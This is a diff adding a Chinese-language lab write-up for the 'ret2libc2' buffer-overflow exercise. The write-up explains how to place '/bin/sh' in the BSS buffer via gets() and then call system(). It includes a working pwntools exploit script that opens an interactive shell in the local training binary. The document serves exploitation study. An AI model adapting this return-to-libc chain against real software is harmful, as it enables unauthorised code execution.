@@ -525,7 +525,58 @@ pwn_obj.interactive()
 
 ## 05 ret2libc-2
 
+例行检查：
 
+![image-20230418201515494](./README.assets/image-20230418201515494.png)
+
+![image-20230418201545230](./README.assets/image-20230418201545230.png)
+
+![image-20230418201601839](./README.assets/image-20230418201601839.png)
+
+![image-20230418201651174](./README.assets/image-20230418201651174.png)
+
+没有现成的“/bin/sh”字符串可以用了，需要手动写入。参考ret2shellcode那里，可以把外部数据写入BSS段，而且这次写入的只是字符串而不是汇编指令，BSS不可执行对此没有影响。用IDA可以看到BSS段里面依旧存在可以利用的缓冲区。
+
+![image-20230418202432682](./README.assets/image-20230418202432682.png)
+
+这次没有现成的strncpy()函数可以利用，但是可以通过和上一个实验类似的方式调用gets()函数，其参数为BSS段缓冲区buf2的地址：
+
+![stack-4](./README.assets/stack-4.jpg)
+
+在gets()函数被执行之后，main()的返回地址（被替换成了gets()的地址）以及gets()的返回地址会被`RET`指令弹出，但是gets()的参数还留在栈顶，需要清除掉后再放入system()的返回地址和参数（system的地址就是gets()的返回地址）。理论上的方案是现在代码段中找到`POP`指令插入到gets()和system()之间，但是我觉得反正system()并不在乎返回地址，就干脆直接用遗留下来的gets()参数得了。因此shellcode方案就是：
+
+* 112字节填充
+* gets函数地址：elf.plt["gets"]
+* gets函数返回地址：system函数的地址：elf.plt["system"]
+* gets参数：buf2地址：elf.symbol["buf2"]
+* system参数：buf2地址：elf.symbol["buf2"]
+
+然后在送入一个“/bin/sh”作为gets()函数的输入：
+
+```python
+from pwn import *
+
+
+# ret2libc2
+elf = ELF("./ret2libc2")
+addr_system_plt = elf.plt["system"]
+addr_gets_plt = elf.plt["gets"]
+addr_buf2 = elf.symbols["buf2"]
+
+pwn_obj = process("./ret2libc2")
+pwn_obj.sendline(
+    b"#" * 112 + 
+    p32(addr_gets_plt) + 
+    p32(addr_system_plt) + 
+    p32(addr_buf2) + 
+    p32(addr_buf2))
+pwn_obj.sendline(b"/bin/sh")
+pwn_obj.interactive()
+```
+
+看看效果：
+
+![image-20230418205556136](./README.assets/image-20230418205556136.png)
 
 ## 06 ret2libc-3
 
